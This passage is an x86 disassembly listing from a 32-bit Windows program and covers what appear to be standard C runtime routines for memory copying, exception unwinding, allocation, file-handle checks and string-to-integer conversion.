  405784:	mov    al,BYTE PTR [esi]
  405786:	mov    BYTE PTR [edi],al
  405788:	mov    al,BYTE PTR [esi+0x1]
  40578b:	mov    BYTE PTR [edi+0x1],al
  40578e:	mov    al,BYTE PTR [esi+0x2]
  405791:	mov    BYTE PTR [edi+0x2],al
  405794:	mov    eax,DWORD PTR [ebp+0x8]
  405797:	pop    esi
  405798:	pop    edi
  405799:	leave  
  40579a:	ret    
  40579b:	nop
  40579c:	lea    esi,[ecx+esi*1-0x4]
  4057a0:	lea    edi,[ecx+edi*1-0x4]
  4057a4:	test   edi,0x3
  4057aa:	jne    0x4057d0
  4057ac:	shr    ecx,0x2
  4057af:	and    edx,0x3
  4057b2:	cmp    ecx,0x8
  4057b5:	jb     0x4057c4
  4057b7:	std    
  4057b8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ba:	cld    
  4057bb:	jmp    DWORD PTR [edx*4+0x4058e8]
  4057c2:	mov    edi,edi
  4057c4:	neg    ecx
  4057c6:	jmp    DWORD PTR [ecx*4+0x405898]
  4057cd:	lea    ecx,[ecx+0x0]
  4057d0:	mov    eax,edi
  4057d2:	mov    edx,0x3
  4057d7:	cmp    ecx,0x4
  4057da:	jb     0x4057e8
  4057dc:	and    eax,0x3
  4057df:	sub    ecx,eax
  4057e1:	jmp    DWORD PTR [eax*4+0x4057ec]
  4057e8:	jmp    DWORD PTR [ecx*4+0x4058e8]
  4057ef:	nop
  4057f0:	cld    
  4057f1:	push   edi
  4057f2:	inc    eax
  4057f3:	add    BYTE PTR [eax],ah
  4057f5:	pop    eax
  4057f6:	inc    eax
  4057f7:	add    BYTE PTR [eax+0x58],cl
  4057fa:	inc    eax
  4057fb:	add    BYTE PTR [edx-0x2edcfcba],cl
  405801:	mov    BYTE PTR [edi+0x3],al
  405804:	sub    esi,0x1
  405807:	shr    ecx,0x2
  40580a:	sub    edi,0x1
  40580d:	cmp    ecx,0x8
  405810:	jb     0x4057c4
  405812:	std    
  405813:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405815:	cld    
  405816:	jmp    DWORD PTR [edx*4+0x4058e8]
  40581d:	lea    ecx,[ecx+0x0]
  405820:	mov    al,BYTE PTR [esi+0x3]
  405823:	and    edx,ecx
  405825:	mov    BYTE PTR [edi+0x3],al
  405828:	mov    al,BYTE PTR [esi+0x2]
  40582b:	shr    ecx,0x2
  40582e:	mov    BYTE PTR [edi+0x2],al
  405831:	sub    esi,0x2
  405834:	sub    edi,0x2
  405837:	cmp    ecx,0x8
  40583a:	jb     0x4057c4
  40583c:	std    
  40583d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40583f:	cld    
  405840:	jmp    DWORD PTR [edx*4+0x4058e8]
  405847:	nop
  405848:	mov    al,BYTE PTR [esi+0x3]
  40584b:	and    edx,ecx
  40584d:	mov    BYTE PTR [edi+0x3],al
  405850:	mov    al,BYTE PTR [esi+0x2]
  405853:	mov    BYTE PTR [edi+0x2],al
  405856:	mov    al,BYTE PTR [esi+0x1]
  405859:	shr    ecx,0x2
  40585c:	mov    BYTE PTR [edi+0x1],al
  40585f:	sub    esi,0x3
  405862:	sub    edi,0x3
  405865:	cmp    ecx,0x8
  405868:	jb     0x4057c4
  40586e:	std    
  40586f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405871:	cld    
  405872:	jmp    DWORD PTR [edx*4+0x4058e8]
  405879:	lea    ecx,[ecx+0x0]
  40587c:	pushf  
  40587d:	pop    eax
  40587e:	inc    eax
  40587f:	add    BYTE PTR [eax+ebx*2+0x58ac0040],ah
  405886:	inc    eax
  405887:	add    BYTE PTR [eax+ebx*2+0x58bc0040],dh
  40588e:	inc    eax
  40588f:	add    ah,al
  405891:	pop    eax
  405892:	inc    eax
  405893:	add    ah,cl
  405895:	pop    eax
  405896:	inc    eax
  405897:	add    bh,bl
  405899:	pop    eax
  40589a:	inc    eax
  40589b:	add    BYTE PTR [ebx-0x76e371bc],cl
  4058a1:	inc    esp
  4058a2:	(bad)  
  4058a3:	sbb    al,0x8b
  4058a5:	inc    esp
  4058a6:	mov    ds,WORD PTR [eax]
  4058a8:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  4058ac:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4058b0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4058b4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4058b8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4058bc:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4058c0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4058c4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4058c8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4058cc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4058d0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4058d4:	lea    eax,[ecx*4+0x0]
  4058db:	add    esi,eax
  4058dd:	add    edi,eax
  4058df:	jmp    DWORD PTR [edx*4+0x4058e8]
  4058e6:	mov    edi,edi
  4058e8:	clc    
  4058e9:	pop    eax
  4058ea:	inc    eax
  4058eb:	add    BYTE PTR [eax],al
  4058ed:	pop    ecx
  4058ee:	inc    eax
  4058ef:	add    BYTE PTR [eax],dl
  4058f1:	pop    ecx
  4058f2:	inc    eax
  4058f3:	add    BYTE PTR [ecx+ebx*2],ah
  4058f6:	inc    eax
  4058f7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4058fd:	leave  
  4058fe:	ret    
  4058ff:	nop
  405900:	mov    al,BYTE PTR [esi+0x3]
  405903:	mov    BYTE PTR [edi+0x3],al
  405906:	mov    eax,DWORD PTR [ebp+0x8]
  405909:	pop    esi
  40590a:	pop    edi
  40590b:	leave  
  40590c:	ret    
  40590d:	lea    ecx,[ecx+0x0]
  405910:	mov    al,BYTE PTR [esi+0x3]
  405913:	mov    BYTE PTR [edi+0x3],al
  405916:	mov    al,BYTE PTR [esi+0x2]
  405919:	mov    BYTE PTR [edi+0x2],al
  40591c:	mov    eax,DWORD PTR [ebp+0x8]
  40591f:	pop    esi
  405920:	pop    edi
  405921:	leave  
  405922:	ret    
  405923:	nop
  405924:	mov    al,BYTE PTR [esi+0x3]
  405927:	mov    BYTE PTR [edi+0x3],al
  40592a:	mov    al,BYTE PTR [esi+0x2]
  40592d:	mov    BYTE PTR [edi+0x2],al
  405930:	mov    al,BYTE PTR [esi+0x1]
  405933:	mov    BYTE PTR [edi+0x1],al
  405936:	mov    eax,DWORD PTR [ebp+0x8]
  405939:	pop    esi
  40593a:	pop    edi
  40593b:	leave  
  40593c:	ret    
  40593d:	int3   
  40593e:	int3   
  40593f:	int3   
  405940:	push   ebp
  405941:	mov    ebp,esp
  405943:	push   ebx
  405944:	push   esi
  405945:	push   edi
  405946:	push   ebp
  405947:	push   0x0
  405949:	push   0x0
  40594b:	push   0x405958
  405950:	push   DWORD PTR [ebp+0x8]
  405953:	call   0x406548
  405958:	pop    ebp
  405959:	pop    edi
  40595a:	pop    esi
  40595b:	pop    ebx
  40595c:	mov    esp,ebp
  40595e:	pop    ebp
  40595f:	ret    
  405960:	mov    ecx,DWORD PTR [esp+0x4]
  405964:	test   DWORD PTR [ecx+0x4],0x6
  40596b:	mov    eax,0x1
  405970:	je     0x405981
  405972:	mov    eax,DWORD PTR [esp+0x8]
  405976:	mov    edx,DWORD PTR [esp+0x10]
  40597a:	mov    DWORD PTR [edx],eax
  40597c:	mov    eax,0x3
  405981:	ret    
  405982:	push   ebx
  405983:	push   esi
  405984:	push   edi
  405985:	mov    eax,DWORD PTR [esp+0x10]
  405989:	push   eax
  40598a:	push   0xfffffffe
  40598c:	push   0x405960
  405991:	push   DWORD PTR fs:0x0
  405998:	mov    DWORD PTR fs:0x0,esp
  40599f:	mov    eax,DWORD PTR [esp+0x20]
  4059a3:	mov    ebx,DWORD PTR [eax+0x8]
  4059a6:	mov    esi,DWORD PTR [eax+0xc]
  4059a9:	cmp    esi,0xffffffff
  4059ac:	je     0x4059dc
  4059ae:	cmp    esi,DWORD PTR [esp+0x24]
  4059b2:	je     0x4059dc
  4059b4:	lea    esi,[esi+esi*2]
  4059b7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4059ba:	mov    DWORD PTR [esp+0x8],ecx
  4059be:	mov    DWORD PTR [eax+0xc],ecx
  4059c1:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  4059c6:	jne    0x4059da
  4059c8:	push   0x101
  4059cd:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  4059d1:	call   0x405a16
  4059d6:	call   DWORD PTR [ebx+esi*4+0x8]
  4059da:	jmp    0x40599f
  4059dc:	pop    DWORD PTR fs:0x0
  4059e3:	add    esp,0xc
  4059e6:	pop    edi
  4059e7:	pop    esi
  4059e8:	pop    ebx
  4059e9:	ret    
  4059ea:	xor    eax,eax
  4059ec:	mov    ecx,DWORD PTR fs:0x0
  4059f3:	cmp    DWORD PTR [ecx+0x4],0x405960
  4059fa:	jne    0x405a0c
  4059fc:	mov    edx,DWORD PTR [ecx+0xc]
  4059ff:	mov    edx,DWORD PTR [edx+0xc]
  405a02:	cmp    DWORD PTR [ecx+0x8],edx
  405a05:	jne    0x405a0c
  405a07:	mov    eax,0x1
  405a0c:	ret    
  405a0d:	push   ebx
  405a0e:	push   ecx
  405a0f:	mov    ebx,0x4273b0
  405a14:	jmp    0x405a20
  405a16:	push   ebx
  405a17:	push   ecx
  405a18:	mov    ebx,0x4273b0
  405a1d:	mov    ecx,DWORD PTR [ebp+0x8]
  405a20:	mov    DWORD PTR [ebx+0x8],ecx
  405a23:	mov    DWORD PTR [ebx+0x4],eax
  405a26:	mov    DWORD PTR [ebx+0xc],ebp
  405a29:	pop    ecx
  405a2a:	pop    ebx
  405a2b:	ret    0x4
  405a2e:	push   ebp
  405a2f:	mov    ebp,esp
  405a31:	sub    esp,0xc
  405a34:	mov    eax,ds:0x4272a8
  405a39:	xor    eax,DWORD PTR [ebp+0x4]
  405a3c:	and    BYTE PTR [ebp-0x6],0x0
  405a40:	push   0x6
  405a42:	mov    DWORD PTR [ebp-0x4],eax
  405a45:	lea    eax,[ebp-0xc]
  405a48:	push   eax
  405a49:	push   0x1004
  405a4e:	push   DWORD PTR [ebp+0x8]
  405a51:	call   DWORD PTR ds:0x4250d8
  405a57:	test   eax,eax
  405a59:	jne    0x405a60
  405a5b:	or     eax,0xffffffff
  405a5e:	jmp    0x405a6a
  405a60:	lea    eax,[ebp-0xc]
  405a63:	push   eax
  405a64:	call   0x405e66
  405a69:	pop    ecx
  405a6a:	mov    ecx,DWORD PTR [ebp-0x4]
  405a6d:	xor    ecx,DWORD PTR [ebp+0x4]
  405a70:	call   0x403606
  405a75:	leave  
  405a76:	ret    
  405a77:	push   0x38
  405a79:	push   0x425b48
  405a7e:	call   0x4030a4
  405a83:	mov    eax,ds:0x4272a8
  405a88:	xor    eax,DWORD PTR [ebp+0x4]
  405a8b:	mov    DWORD PTR [ebp-0x1c],eax
  405a8e:	xor    edi,edi
  405a90:	mov    DWORD PTR [ebp-0x20],edi
  405a93:	mov    DWORD PTR [ebp-0x24],edi
  405a96:	mov    eax,DWORD PTR [ebp+0x14]
  405a99:	mov    ebx,DWORD PTR [eax]
  405a9b:	mov    DWORD PTR [ebp-0x28],ebx
  405a9e:	mov    DWORD PTR [ebp-0x2c],edi
  405aa1:	mov    eax,DWORD PTR [ebp+0x8]
  405aa4:	cmp    eax,DWORD PTR [ebp+0xc]
  405aa7:	je     0x405c20
  405aad:	lea    ecx,[ebp-0x40]
  405ab0:	push   ecx
  405ab1:	push   eax
  405ab2:	mov    esi,DWORD PTR ds:0x4250a8
  405ab8:	call   esi
  405aba:	test   eax,eax
  405abc:	je     0x405ade
  405abe:	cmp    DWORD PTR [ebp-0x40],0x1
  405ac2:	jne    0x405ade
  405ac4:	lea    eax,[ebp-0x40]
  405ac7:	push   eax
  405ac8:	push   DWORD PTR [ebp+0xc]
  405acb:	call   esi
  405acd:	test   eax,eax
  405acf:	je     0x405ade
  405ad1:	cmp    DWORD PTR [ebp-0x40],0x1
  405ad5:	jne    0x405ade
  405ad7:	mov    DWORD PTR [ebp-0x2c],0x1
  405ade:	cmp    DWORD PTR [ebp-0x2c],edi
  405ae1:	je     0x405afd
  405ae3:	cmp    ebx,0xffffffff
  405ae6:	je     0x405aec
  405ae8:	mov    esi,ebx
  405aea:	jmp    0x405af8
  405aec:	push   DWORD PTR [ebp+0x10]
  405aef:	call   0x403a40
  405af4:	pop    ecx
  405af5:	mov    esi,eax
  405af7:	inc    esi
  405af8:	mov    DWORD PTR [ebp-0x44],esi
  405afb:	jmp    0x405b00
  405afd:	mov    esi,DWORD PTR [ebp-0x44]
  405b00:	cmp    DWORD PTR [ebp-0x2c],edi
  405b03:	jne    0x405b1f
  405b05:	push   edi
  405b06:	push   edi
  405b07:	push   ebx
  405b08:	push   DWORD PTR [ebp+0x10]
  405b0b:	push   0x1
  405b0d:	push   DWORD PTR [ebp+0x8]
  405b10:	call   DWORD PTR ds:0x42508c
  405b16:	mov    esi,eax
  405b18:	mov    DWORD PTR [ebp-0x44],esi
  405b1b:	cmp    esi,edi
  405b1d:	je     0x405b77
  405b1f:	mov    DWORD PTR [ebp-0x4],edi
  405b22:	lea    eax,[esi+esi*1]
  405b25:	add    eax,0x3
  405b28:	and    eax,0xfffffffc
  405b2b:	call   0x4030f0
  405b30:	mov    DWORD PTR [ebp-0x18],esp
  405b33:	mov    ebx,esp
  405b35:	mov    DWORD PTR [ebp-0x48],ebx
  405b38:	lea    eax,[esi+esi*1]
  405b3b:	push   eax
  405b3c:	push   edi
  405b3d:	push   ebx
  405b3e:	call   0x403420
  405b43:	add    esp,0xc
  405b46:	or     DWORD PTR [ebp-0x4],0xffffffff
  405b4a:	jmp    0x405b63
  405b4c:	xor    eax,eax
  405b4e:	inc    eax
  405b4f:	ret    
  405b50:	mov    esp,DWORD PTR [ebp-0x18]
  405b53:	call   0x403504
  405b58:	xor    edi,edi
  405b5a:	xor    ebx,ebx
  405b5c:	or     DWORD PTR [ebp-0x4],0xffffffff
  405b60:	mov    esi,DWORD PTR [ebp-0x44]
  405b63:	cmp    ebx,edi
  405b65:	jne    0x405b85
  405b67:	push   esi
  405b68:	push   0x2
  405b6a:	call   0x405c46
  405b6f:	pop    ecx
  405b70:	pop    ecx
  405b71:	mov    ebx,eax
  405b73:	cmp    ebx,edi
  405b75:	jne    0x405b7e
  405b77:	xor    eax,eax
  405b79:	jmp    0x405c32
  405b7e:	mov    DWORD PTR [ebp-0x24],0x1
  405b85:	push   esi
  405b86:	push   ebx
  405b87:	push   DWORD PTR [ebp-0x28]
  405b8a:	push   DWORD PTR [ebp+0x10]
  405b8d:	push   0x1
  405b8f:	push   DWORD PTR [ebp+0x8]
  405b92:	call   DWORD PTR ds:0x42508c
  405b98:	test   eax,eax
  405b9a:	je     0x405c23
  405ba0:	cmp    DWORD PTR [ebp+0x18],edi
  405ba3:	je     0x405bc5
  405ba5:	push   edi
  405ba6:	push   edi
  405ba7:	push   DWORD PTR [ebp+0x1c]
  405baa:	push   DWORD PTR [ebp+0x18]
  405bad:	push   esi
  405bae:	push   ebx
  405baf:	push   edi
  405bb0:	push   DWORD PTR [ebp+0xc]
  405bb3:	call   DWORD PTR ds:0x425070
  405bb9:	test   eax,eax
  405bbb:	je     0x405c23
  405bbd:	mov    eax,DWORD PTR [ebp+0x18]
  405bc0:	mov    DWORD PTR [ebp-0x20],eax
  405bc3:	jmp    0x405c23
  405bc5:	cmp    DWORD PTR [ebp-0x2c],edi
  405bc8:	jne    0x405be0
  405bca:	push   edi
  405bcb:	push   edi
  405bcc:	push   edi
  405bcd:	push   edi
  405bce:	push   esi
  405bcf:	push   ebx
  405bd0:	push   edi
  405bd1:	push   DWORD PTR [ebp+0xc]
  405bd4:	call   DWORD PTR ds:0x425070
  405bda:	mov    esi,eax
  405bdc:	cmp    esi,edi
  405bde:	je     0x405c23
  405be0:	push   esi
  405be1:	push   0x1
  405be3:	call   0x405c46
  405be8:	pop    ecx
  405be9:	pop    ecx
  405bea:	mov    DWORD PTR [ebp-0x20],eax
  405bed:	cmp    eax,edi
  405bef:	je     0x405c23
  405bf1:	push   edi
  405bf2:	push   edi
  405bf3:	push   esi
  405bf4:	push   eax
  405bf5:	push   esi
  405bf6:	push   ebx
  405bf7:	push   edi
  405bf8:	push   DWORD PTR [ebp+0xc]
  405bfb:	call   DWORD PTR ds:0x425070
  405c01:	cmp    eax,edi
  405c03:	jne    0x405c13
  405c05:	push   DWORD PTR [ebp-0x20]
  405c08:	call   0x40331e
  405c0d:	pop    ecx
  405c0e:	mov    DWORD PTR [ebp-0x20],edi
  405c11:	jmp    0x405c23
  405c13:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  405c17:	je     0x405c23
  405c19:	mov    ecx,DWORD PTR [ebp+0x14]
  405c1c:	mov    DWORD PTR [ecx],eax
  405c1e:	jmp    0x405c23
  405c20:	mov    ebx,DWORD PTR [ebp-0x48]
  405c23:	cmp    DWORD PTR [ebp-0x24],edi
  405c26:	je     0x405c2f
  405c28:	push   ebx
  405c29:	call   0x40331e
  405c2e:	pop    ecx
  405c2f:	mov    eax,DWORD PTR [ebp-0x20]
  405c32:	lea    esp,[ebp-0x54]
  405c35:	mov    ecx,DWORD PTR [ebp-0x1c]
  405c38:	xor    ecx,DWORD PTR [ebp+0x4]
  405c3b:	call   0x403606
  405c40:	call   0x4030df
  405c45:	ret    
  405c46:	push   ebx
  405c47:	push   esi
  405c48:	mov    esi,DWORD PTR [esp+0xc]
  405c4c:	imul   esi,DWORD PTR [esp+0x10]
  405c51:	test   esi,esi
  405c53:	push   edi
  405c54:	mov    ebx,esi
  405c56:	jne    0x405c59
  405c58:	inc    esi
  405c59:	xor    edi,edi
  405c5b:	cmp    esi,0xffffffe0
  405c5e:	ja     0x405c99
  405c60:	cmp    DWORD PTR ds:0x428c04,0x3
  405c67:	jne    0x405c84
  405c69:	add    esi,0xf
  405c6c:	and    esi,0xfffffff0
  405c6f:	cmp    ebx,DWORD PTR ds:0x4289b0
  405c75:	ja     0x405c84
  405c77:	push   ebx
  405c78:	call   0x404728
  405c7d:	mov    edi,eax
  405c7f:	test   edi,edi
  405c81:	pop    ecx
  405c82:	jne    0x405caf
  405c84:	push   esi
  405c85:	push   0x8
  405c87:	push   DWORD PTR ds:0x428c00
  405c8d:	call   DWORD PTR ds:0x425090
  405c93:	mov    edi,eax
  405c95:	test   edi,edi
  405c97:	jne    0x405cbb
  405c99:	cmp    DWORD PTR ds:0x427974,0x0
  405ca0:	je     0x405cbb
  405ca2:	push   esi
  405ca3:	call   0x404ee2
  405ca8:	test   eax,eax
  405caa:	pop    ecx
  405cab:	jne    0x405c59
  405cad:	jmp    0x405cbd
  405caf:	push   ebx
  405cb0:	push   0x0
  405cb2:	push   edi
  405cb3:	call   0x403420
  405cb8:	add    esp,0xc
  405cbb:	mov    eax,edi
  405cbd:	pop    edi
  405cbe:	pop    esi
  405cbf:	pop    ebx
  405cc0:	ret    
  405cc1:	mov    eax,DWORD PTR [esp+0x4]
  405cc5:	cmp    eax,DWORD PTR ds:0x428c08
  405ccb:	push   ebx
  405ccc:	push   esi
  405ccd:	push   edi
  405cce:	jae    0x405d35
  405cd0:	mov    ecx,eax
  405cd2:	sar    ecx,0x5
  405cd5:	mov    esi,eax
  405cd7:	and    esi,0x1f
  405cda:	lea    edi,[ecx*4+0x428c20]
  405ce1:	mov    ecx,DWORD PTR [edi]
  405ce3:	shl    esi,0x3
  405ce6:	test   BYTE PTR [ecx+esi*1+0x4],0x1
  405ceb:	je     0x405d35
  405ced:	push   eax
  405cee:	call   0x405f38
  405cf3:	cmp    eax,0xffffffff
  405cf6:	pop    ecx
  405cf7:	je     0x405d3c
  405cf9:	push   DWORD PTR [esp+0x18]
  405cfd:	push   0x0
  405cff:	push   DWORD PTR [esp+0x1c]
  405d03:	push   eax
  405d04:	call   DWORD PTR ds:0x4250dc
  405d0a:	mov    ebx,eax
  405d0c:	cmp    ebx,0xffffffff
  405d0f:	jne    0x405d19
  405d11:	call   DWORD PTR ds:0x42501c
  405d17:	jmp    0x405d1b
  405d19:	xor    eax,eax
  405d1b:	test   eax,eax
  405d1d:	je     0x405d28
  405d1f:	push   eax
  405d20:	call   0x405d4d
  405d25:	pop    ecx
  405d26:	jmp    0x405d46
  405d28:	mov    eax,DWORD PTR [edi]
  405d2a:	lea    eax,[eax+esi*1+0x4]
  405d2e:	and    BYTE PTR [eax],0xfd
  405d31:	mov    eax,ebx
  405d33:	jmp    0x405d49
  405d35:	and    DWORD PTR ds:0x4277d0,0x0
  405d3c:	mov    DWORD PTR ds:0x4277cc,0x9
  405d46:	or     eax,0xffffffff
  405d49:	pop    edi
  405d4a:	pop    esi
  405d4b:	pop    ebx
  405d4c:	ret    
  405d4d:	mov    eax,DWORD PTR [esp+0x4]
  405d51:	mov    ds:0x4277d0,eax
  405d56:	xor    ecx,ecx
  405d58:	cmp    eax,DWORD PTR [ecx*8+0x4273c0]
  405d5f:	je     0x405d7c
  405d61:	inc    ecx
  405d62:	cmp    ecx,0x2d
  405d65:	jb     0x405d58
  405d67:	cmp    eax,0x13
  405d6a:	jb     0x405d89
  405d6c:	cmp    eax,0x24
  405d6f:	ja     0x405d89
  405d71:	mov    DWORD PTR ds:0x4277cc,0xd
  405d7b:	ret    
  405d7c:	mov    eax,DWORD PTR [ecx*8+0x4273c4]
  405d83:	mov    ds:0x4277cc,eax
  405d88:	ret    
  405d89:	cmp    eax,0xbc
  405d8e:	jb     0x405da1
  405d90:	cmp    eax,0xca
  405d95:	mov    DWORD PTR ds:0x4277cc,0x8
  405d9f:	jbe    0x405dab
  405da1:	mov    DWORD PTR ds:0x4277cc,0x16
  405dab:	ret    
  405dac:	mov    eax,ds:0x4289a0
  405db1:	test   eax,eax
  405db3:	push   esi
  405db4:	push   0x14
  405db6:	pop    esi
  405db7:	jne    0x405dc0
  405db9:	mov    eax,0x200
  405dbe:	jmp    0x405dc6
  405dc0:	cmp    eax,esi
  405dc2:	jge    0x405dcb
  405dc4:	mov    eax,esi
  405dc6:	mov    ds:0x4289a0,eax
  405dcb:	push   0x4
  405dcd:	push   eax
  405dce:	call   0x405c46
  405dd3:	test   eax,eax
  405dd5:	pop    ecx
  405dd6:	pop    ecx
  405dd7:	mov    ds:0x427984,eax
  405ddc:	jne    0x405dfc
  405dde:	push   0x4
  405de0:	push   esi
  405de1:	mov    DWORD PTR ds:0x4289a0,esi
  405de7:	call   0x405c46
  405dec:	test   eax,eax
  405dee:	pop    ecx
  405def:	pop    ecx
  405df0:	mov    ds:0x427984,eax
  405df5:	jne    0x405dfc
  405df7:	push   0x1a
  405df9:	pop    eax
  405dfa:	pop    esi
  405dfb:	ret    
  405dfc:	xor    edx,edx
  405dfe:	mov    ecx,0x427528
  405e03:	jmp    0x405e0a
  405e05:	mov    eax,ds:0x427984
  405e0a:	mov    DWORD PTR [edx+eax*1],ecx
  405e0d:	add    ecx,0x20
  405e10:	add    edx,0x4
  405e13:	cmp    ecx,0x4277a8
  405e19:	jl     0x405e05
  405e1b:	xor    edx,edx
  405e1d:	mov    ecx,0x427538
  405e22:	mov    eax,edx
  405e24:	sar    eax,0x5
  405e27:	mov    eax,DWORD PTR [eax*4+0x428c20]
  405e2e:	mov    esi,edx
  405e30:	and    esi,0x1f
  405e33:	mov    eax,DWORD PTR [eax+esi*8]
  405e36:	cmp    eax,0xffffffff
  405e39:	je     0x405e3f
  405e3b:	test   eax,eax
  405e3d:	jne    0x405e42
  405e3f:	or     DWORD PTR [ecx],0xffffffff
  405e42:	add    ecx,0x20
  405e45:	inc    edx
  405e46:	cmp    ecx,0x427598
  405e4c:	jl     0x405e22
  405e4e:	xor    eax,eax
  405e50:	pop    esi
  405e51:	ret    
  405e52:	call   0x4060d1
  405e57:	cmp    BYTE PTR ds:0x427810,0x0
  405e5e:	je     0x405e65
  405e60:	jmp    0x405f74
  405e65:	ret    
  405e66:	push   esi
  405e67:	mov    esi,DWORD PTR [esp+0x8]
  405e6b:	jmp    0x405e6e
  405e6d:	inc    esi
  405e6e:	movzx  eax,BYTE PTR [esi]
  405e71:	push   eax
  405e72:	call   0x4060da
  405e77:	test   eax,eax
  405e79:	pop    ecx
  405e7a:	jne    0x405e6d
  405e7c:	movzx  ecx,BYTE PTR [esi]
  405e7f:	inc    esi
  405e80:	cmp    ecx,0x2d
  405e83:	mov    edx,ecx
  405e85:	je     0x405e8c
  405e87:	cmp    ecx,0x2b
  405e8a:	jne    0x405e90
  405e8c:	movzx  ecx,BYTE PTR [esi]
  405e8f:	inc    esi
  405e90:	xor    eax,eax
  405e92:	cmp    ecx,0x30
  405e95:	jl     0x405ea1
  405e97:	cmp    ecx,0x39
  405e9a:	jg     0x405ea1
  405e9c:	sub    ecx,0x30
  405e9f:	jmp    0x405ea4
  405ea1:	or     ecx,0xffffffff
  405ea4:	cmp    ecx,0xffffffff
  405ea7:	je     0x405eb5
  405ea9:	lea    eax,[eax+eax*4]
  405eac:	lea    eax,[ecx+eax*2]
  405eaf:	movzx  ecx,BYTE PTR [esi]
  405eb2:	inc    esi
  405eb3:	jmp    0x405e92
  405eb5:	cmp    edx,0x2d
  405eb8:	pop    esi
  405eb9:	jne    0x405ebd
  405ebb:	neg    eax
  405ebd:	ret    
  405ebe:	mov    ecx,DWORD PTR [esp+0x4]
  405ec2:	cmp    ecx,DWORD PTR ds:0x428c08
  405ec8:	push   esi
  405ec9:	push   edi
  405eca:	jae    0x405f21
  405ecc:	mov    eax,ecx
  405ece:	sar    eax,0x5
  405ed1:	mov    esi,ecx
  405ed3:	lea    edi,[eax*4+0x428c20]
  405eda:	mov    eax,DWORD PTR [edi]
  405edc:	and    esi,0x1f
  405edf:	shl    esi,0x3
  405ee2:	add    eax,esi
  405ee4:	test   BYTE PTR [eax+0x4],0x1
  405ee8:	je     0x405f21
  405eea:	cmp    DWORD PTR [eax],0xffffffff
  405eed:	je     0x405f21
  405eef:	cmp    DWORD PTR ds:0x427144,0x1
  405ef6:	jne    0x405f17
  405ef8:	xor    eax,eax
  405efa:	sub    ecx,eax
  405efc:	je     0x405f0e
  405efe:	dec    ecx
  405eff:	je     0x405f09
  405f01:	dec    ecx
  405f02:	jne    0x405f17
  405f04:	push   eax
  405f05:	push   0xfffffff4
  405f07:	jmp    0x405f11
  405f09:	push   eax
  405f0a:	push   0xfffffff5
  405f0c:	jmp    0x405f11
  405f0e:	push   eax
  405f0f:	push   0xfffffff6
  405f11:	call   DWORD PTR ds:0x425038
  405f17:	mov    eax,DWORD PTR [edi]
  405f19:	or     DWORD PTR [esi+eax*1],0xffffffff
  405f1d:	xor    eax,eax
  405f1f:	jmp    0x405f35
  405f21:	and    DWORD PTR ds:0x4277d0,0x0
  405f28:	mov    DWORD PTR ds:0x4277cc,0x9
  405f32:	or     eax,0xffffffff
  405f35:	pop    edi
  405f36:	pop    esi
  405f37:	ret    
  405f38:	mov    eax,DWORD PTR [esp+0x4]
  405f3c:	cmp    eax,DWORD PTR ds:0x428c08
  405f42:	jae    0x405f5f
  405f44:	mov    ecx,eax
  405f46:	sar    ecx,0x5
  405f49:	mov    ecx,DWORD PTR [ecx*4+0x428c20]
  405f50:	and    eax,0x1f
  405f53:	lea    eax,[ecx+eax*8]
  405f56:	test   BYTE PTR [eax+0x4],0x1
  405f5a:	je     0x405f5f
  405f5c:	mov    eax,DWORD PTR [eax]
  405f5e:	ret    
  405f5f:	and    DWORD PTR ds:0x4277d0,0x0
  405f66:	mov    DWORD PTR ds:0x4277cc,0x9
  405f70:	or     eax,0xffffffff
  405f73:	ret    
  405f74:	push   esi
  405f75:	push   edi
  405f76:	push   0x3
  405f78:	pop    esi
  405f79:	xor    edi,edi
  405f7b:	cmp    DWORD PTR ds:0x4289a0,esi
  405f81:	jle    0x405fc7
  405f83:	mov    eax,ds:0x427984
  405f88:	mov    eax,DWORD PTR [eax+esi*4]
  405f8b:	test   eax,eax
  405f8d:	je     0x405fbe
  405f8f:	test   BYTE PTR [eax+0xc],0x83
  405f93:	je     0x405fa2
  405f95:	push   eax
  405f96:	call   0x40616a
  405f9b:	cmp    eax,0xffffffff
  405f9e:	pop    ecx
  405f9f:	je     0x405fa2
  405fa1:	inc    edi
  405fa2:	cmp    esi,0x14
  405fa5:	jl     0x405fbe
  405fa7:	mov    eax,ds:0x427984
  405fac:	push   DWORD PTR [eax+esi*4]
  405faf:	call   0x40331e
  405fb4:	mov    eax,ds:0x427984
  405fb9:	and    DWORD PTR [eax+esi*4],0x0
  405fbd:	pop    ecx
  405fbe:	inc    esi
  405fbf:	cmp    esi,DWORD PTR ds:0x4289a0
  405fc5:	jl     0x405f83
  405fc7:	mov    eax,edi
  405fc9:	pop    edi
  405fca:	pop    esi
  405fcb:	ret    
  405fcc:	push   ebx
  405fcd:	push   esi
  405fce:	mov    esi,DWORD PTR [esp+0xc]
  405fd2:	mov    eax,DWORD PTR [esi+0xc]
  405fd5:	mov    ecx,eax
  405fd7:	and    cl,0x3
  405fda:	xor    ebx,ebx
  405fdc:	cmp    cl,0x2
  405fdf:	jne    0x40601b
  405fe1:	test   ax,0x108
  405fe5:	je     0x40601b
  405fe7:	mov    eax,DWORD PTR [esi+0x8]
  405fea:	push   edi
  405feb:	mov    edi,DWORD PTR [esi]
  405fed:	sub    edi,eax
  405fef:	test   edi,edi
  405ff1:	jle    0x40601a
  405ff3:	push   edi
  405ff4:	push   eax
  405ff5:	push   DWORD PTR [esi+0x10]
  405ff8:	call   0x4061c0
  405ffd:	add    esp,0xc
